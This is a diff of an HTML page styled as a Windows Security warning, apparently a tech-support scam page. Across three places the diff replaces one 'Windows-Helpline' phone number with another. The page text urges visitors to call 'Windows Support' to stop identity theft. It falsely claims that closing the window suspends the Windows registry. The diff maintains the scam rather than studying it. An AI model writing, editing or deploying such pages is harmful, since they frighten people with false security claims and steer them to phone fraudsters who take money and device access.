@@ -141,7 +141,7 @@
             <div class="right-foot" style="text-align: center;">
                 <span id="footertxt"><img src="microsoft.png"> Windows Security: </span><span
                         style="font-weight: 700;padding-left: 13px;color: #fff;">Windows-Helpline <span
-                            style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;margin-left: 5px;">+1-866-664-1242 </span></span>
+                            style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;margin-left: 5px;">+1-844-636-0496 </span></span>
             </div>
         </div>
         <div class="col-md-12">
@@ -179,7 +179,7 @@
     </div>
    <!--  <img id="banner" src="websafg.jpg"> -->
     <div id="disclaimer" style="text-align: center;">
-        <span class="support">Windows-Helpline: +1-866-664-1242</span>
+        <span class="support">Windows-Helpline: +1-844-636-0496</span>
     </div>
 
 </div>
@@ -230,7 +230,7 @@
       <p>Call Windows Support immediately to report this threat, prevent identity theft and unlock access to this device.</p>
       <p>Closing this window puts your personal data at risk and results in a suspension of your Windows registry.</p>
     <p style="padding-bottom: 0px; color:#fff; font-size:14px;">Call Windows Support: <strong>
-            +1-866-664-1242</strong></p>
+            +1-844-636-0496</strong></p>
     <div class="action_buttons"><a class="active" id="leave_page"
                                    style="cursor: pointer; color: #FFFFFF !important;">Run safely</a> <a class="active"
                                                                                                  id="leave_page"
